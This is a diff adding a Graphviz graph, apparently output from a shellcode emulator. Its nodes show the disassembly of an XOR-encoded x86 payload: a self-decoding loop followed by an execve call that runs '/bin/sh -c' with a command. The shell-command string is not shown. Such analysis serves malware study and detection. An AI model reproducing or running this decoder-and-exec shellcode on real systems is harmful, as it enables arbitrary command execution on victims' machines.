@@ -1,0 +1,16 @@
+digraph G {
+	//rankdir=LR
+	node [fontname=Courier, labeljust=r];
+	 "0x6e7b40" [shape=box, label = "0x00417000 D9E9                            fldln2 \l0x00417002 BA33D47E78                      mov edx,0x787ed433\l0x00417007 D97424F4                        fstenv [esp-0xc]\l0x0041700b 5D                              pop ebp\l0x0041700c 2BC9                            sub ecx,ecx\l0x0041700e B10D                            mov cl,0xd\l"]
+	 "0x6e5a90" [shape=box, label = "0x00417010 31551A                          xor [ebp+0x1a],edx\l"]
+	 "0x6e55c0" [shape=box, label = "0x00417013 83EDFC                          sub ebp,0xfffffffc\l0x00417016 035516                          add edx,[ebp+0x16]\l"]
+	 "0x6e4ec0" [shape=box, label = "0x00417019 E2F5                            loop 0xfffffff7\l"]
+	 "0x6e19f0" [shape=box, label = "0x0041701b 6A0B                            push byte 0xb\l0x0041701d 58                              pop eax\l0x0041701e 99                              cwd \l0x0041701f 52                              push edx\l0x00417020 66682D63                        push word 0x632d\l0x00417024 89E7                            mov edi,esp\l0x00417026 682F736800                      push dword 0x68732f\l0x0041702b 682F62696E                      push dword 0x6e69622f\l0x00417030 89E3                            mov ebx,esp\l0x00417032 52                              push edx\l0x00417033 E810000000                      call 0x15\l0x00417048 57                              push edi\l0x00417049 53                              push ebx\l0x0041704a 89E1                            mov ecx,esp\l"]
+	 "0x6e4630" [shape=box, style=filled, color=".7 .3 1.0", label = "0x0041704c execve\l"]
+	 "0x6e7b40" -> "0x6e5a90" [style = bold ]
+	 "0x6e5a90" -> "0x6e55c0" [style = bold, color=orange ]
+	 "0x6e55c0" -> "0x6e4ec0" [style = bold, color=orange ]
+	 "0x6e4ec0" -> "0x6e5a90" [style = bold, color=orange ]
+	 "0x6e4ec0" -> "0x6e19f0" [style = bold ]
+	 "0x6e19f0" -> "0x6e4630" [style = bold ]
+}
